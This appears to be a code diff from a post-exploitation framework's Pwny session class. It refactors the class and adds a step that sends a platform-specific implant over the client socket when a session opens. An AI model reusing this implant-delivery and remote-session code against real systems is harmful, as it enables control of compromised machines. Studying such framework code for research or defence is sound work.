@@ -27,6 +27,7 @@ import socket
 
 from typing import Union
 
+from . import Pwny
 from .tlv import TLV, TLVPacket
 from .console import Console
 
@@ -36,7 +37,7 @@ from hatsploit.lib.session import Session
 from pex.proto.channel import ChannelClient
 
 
-class PwnySession(Session, Console, TLV):
+class PwnySession(Pwny, Session, Console, TLV):
     """ Subclass of pwny module.
 
     This subclass of pwny module represents an implementation
@@ -58,12 +59,9 @@ class PwnySession(Session, Console, TLV):
 
         self.channel = None
 
-        self.details = {
-            'Post': "",
-            'Platform': "",
-            'Architecture': "",
+        self.details.update({
             'Type': "pwny"
-        }
+        })
 
     def open(self, client: socket.socket) -> None:
         """ Open the Pwny session.
@@ -71,6 +69,11 @@ class PwnySession(Session, Console, TLV):
         :param socket.socket client: client to open session with
         :return None: None
         """
+
+        client.send(self.get_implant(
+            platform=self.details['Platform'],
+            arch=self.details['Architecture']
+        ))
 
         self.channel = ChannelClient(client)
         self.start_pwny(self)
